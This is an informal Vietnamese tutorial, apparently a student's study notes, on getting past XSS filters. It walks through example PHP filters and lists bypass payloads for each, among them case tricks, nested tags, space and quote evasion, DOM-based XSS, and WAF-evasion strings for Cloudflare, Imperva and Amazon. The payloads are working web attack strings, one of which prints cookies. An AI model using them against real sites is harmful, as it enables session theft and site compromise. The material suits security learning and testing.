### Một số cách bypass XSS filter

- Bình thường với một lập trình viên hiện tại sẽ được cho tìm hiểu về một sỗ lỗ hổng tiêu biểu hay gặp đặc biệt là XSS, nên bạn sx thường xuyên gặp những trang web filter để chống lại XSS.


1. Filter thẻ :
- Vì thẻ javascript và các thẻ trong html là nguyên nhân chính gây ra XSS nên việc filter thẻ trong đầu vào của user là cần thiết ạ:<script

Ví dụ :
![Alt text](image-5.png)
- Đoạn code php này sẽ lấy name từ method GET và đưa vào hàm filter trước khi in ra Hello + name
- Hàm filter đã lại bỏ tất cả <script có chứa trong input và thay thế bằng ''
- Một hướng bypass đơn giản là thay script bằng  <SCRIPT hoặc <ScRiPt, và rất nhiều các thẻ HTML có thể thực thi javscript khác,...
                                        <SCRIPT>alert(1)</SCRIPT>

Đây là kết quả:
![Alt text](image-6.png)

2. Filter thẻ (case insensitive)
- Giống như ở trên nhưng mà trường hợp này sẽ không phân biệt chữ hoa chữ thường ạ.

Ví dụ :
![Alt text](image-7.png)

- Câu lệnh regex /<script/i được sử dụng để tìm kiếm chuỗi có chứa từ "<script" (không phân biệt chữ hoa chữ thường). Đây là một mẫu regex đơn giản với một số thành phần cụ thể:

+ /<script: Bắt đầu với ký tự <script.
+ /i: Ký tự này ở cuối biểu thức là một cờ (flag) để bật chế độ không phân biệt chữ hoa chữ thường.

- Một hướng bypass đơn giản với payload :
                                        <scrip<SCRIPTt>alert(1)</script>
- giải thích bởi vì khi match thấy <SCRIPT là sẽ filter thành '' nên em sẽ lồng như này sau khi filter sẽ trở thành 
                                        <script>alert(1)</script>
Và kết quả em được là :

![alt text](image-9.png)

- Hoặc em sẽ không cần dùng thẻ . Có rất nhiều thẻ HTML khác có thể thực thi script ( trên payload all the things ạ) như là:
![alt text](image-10.png)

- Ngoài ra mình có thể chèn thẻ khác không có trong định nghĩa tùy theo hoạt động của browser ạ hoặc một số version của browser ạ
![alt text](image-11.png)

- ![alt text](image-12.png)

3. Filter kí tự space

Ví dụ: 
![alt text](image-13.png)
- đoạn code này sẽ filter kí tự space và <script cả hoa và thường :
- Nên một hướng bypass nó sẽ là :
                                        <img/onerror='alert(1)'src=a>

![alt text](image-14.png)




4. Filter kí tự ‘, “, `

Ví dụ: 
![alt text](image-15.png)
- Đoạn code này sẽ filter kí tự <script và các kí tự ‘, “, ` để tránh dùng javascript
- Hướng bypass của nó sẽ là :
![alt text](image-16.png)
- Và có kết quả là :
![alt text](image-17.png)

5. Filter Script code
![alt text](image-18.png)
- Đoạn code trên sẽ filter chữ cookie để tránh hacker lấy được cookie của nạn nhân
- Bypass: Dùng Unicode character

![alt text](image-19.png)

Hoặc tạo chuỗi động (các payload dưới đây để bypass filter cụm ‘alert’):
![alt text](image-20.png)
- Sử dụng eval để biến nó thành mã ạ:<


6. Sanitize kí tự quote, doublequote trong string
![alt text](image-21.png)

- phát hiện kí tự double quote và sanitize bằng cách thêm dấu \ phía trước để tránh nó hoạt động ạ.

- Bypass bằng \”, kí tự \ đầu tiên sẽ triệt tiêu hiệu quả của dấu \ được chèn vào, nên “ vẫn có hiệu lực để unquote string.
![alt text](image-22.png)

7. Limit input length
- Đây là một cách mà người viết mã hạn chế tối thiểu đầu vào của hacker.
![alt text](image-23.png)

- Nhìn sơ qua code thì em thấy sever chỉ lấy 42 kí tự từ chuỗi nhập vào của người dùng ạ

Bypass: Chuyển Reflected XSS thành DOM based XSS.

![alt text](image-24.png)

- Hoặc khi server có nhiều trường bị lỗi XSS, ta sẽ dùng kĩ thuật multi injection:
![alt text](image-25.png)

- Trong đó /* */ là cách để comment trong javascript. Kĩ thuật multi injection cũng được dùng để bypass các bộ lọc khác bằng cách chia nhỏ payload ra thành nhiều phần.


8. XSS xảy ra trong chuỗi ký tự
                                        <script>var q="";alert(1)//"</script>

9. XSS được thiết lập chỉ bởi URL (chẳng hạn như khi giá trị đầu vào nhập trực tiếp vào phần href của thẻ a)
                                        <a href="javascript:alert(1)">Link</a>
10. 
                                        <div>`-alert(1)</script><script>`</div>
                                        <div>`-alert(1)</script><script>`</div>
11. Nếu có một hoạt động chuỗi(giống với mục 1,2,3,4)
- Khi một số chuỗi bị xóa hoặc thay thế, nó không thể bị chặn nếu chuỗi được đặt ở giữa.
                                        <svg o<script>nload=alert(1)>
                                          ↓
                                        <svg onload=alert(1)>

12. document.write()XSS dựa trên DOM không phải là chuỗi yêu cầu
                                        https://vulnerabledoma.in/bypass/dom_innerhtml#%3Cimg%20src=x%20onerror=alert(1)%3E
<body>
<script>
hash=location.hash.slice(1);
document.body.innerHTML=decodeURIComponent(hash);
</script>
</body>

                                        https://vulnerabledoma.in/bypass/dom_redirect#javascript:alert(1)
<script>
location.href=decodeURIComponent(location.hash.slice(1));
</script>

13. XSS trong các trang XML
https://vulnerabledoma.in/bypass/xml?q=%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E
<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>

Ngoài ra còn rất nhiều kiểu filter XSS khác nhau do các dev có tư duy filter riêng của mình, em có tìm được 2 trang có đầy đủ hầu hết các kiểu bypass ạ:3

# https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet#xss-auditor
# https://github.com/masatokinugawa/filterbypass/wiki/Browser’s-XSS-Filter-Bypass-Cheat-Sheet
Và cả trên payload all the thing nữa ạ.




## Một số cách dị em đọc được trên trang NhatTruong Blog ạ:<
- Cloudflare XSS Bypass

          <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>

          <img src=x onVector=X-Vector onerror=alert(1)>
- XXS Bypass Imperva WAF

           (Z("onerror="a=console,a.log`${cookie}`"
- Bypass WAF Amazon

           <a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>
- Crlf injection to bypass javascript: Đang bị bờ lách lít

            java%0d%0ascript%0d%0a:alert(0)
- Trong trường hợp svg onload= bị filter, %0d sẽ đóng vai trò dấu ngăn cách và thỉnh thoảng cũng phá được waf :v.) %0a %0c %09 %00 cũng hay được sử dụng lắm nhé

            <svg%0donload=prompt(1)>
- Cách này bt không có gì :v

            <input onfocus=alert(0) autofocus>
- The use of \\ will break out of the quote inside a script tag

-            \\"-alert(0);//
-  The WAF blacklisted alert(0), prompt(0), but failed to filter confirm(1) aswell as onmouseenter=. Onmouseneter does the same as onmouseover= but a lot of devs seem to not know this (not sure why) and fail to blacklist it.

              "onmouseenter=confirm(1)>
- HTML Injection?

               <base href=//yoursite.com>

               %uff1cscript%uff1ealert(1)%uff1c/script%uff1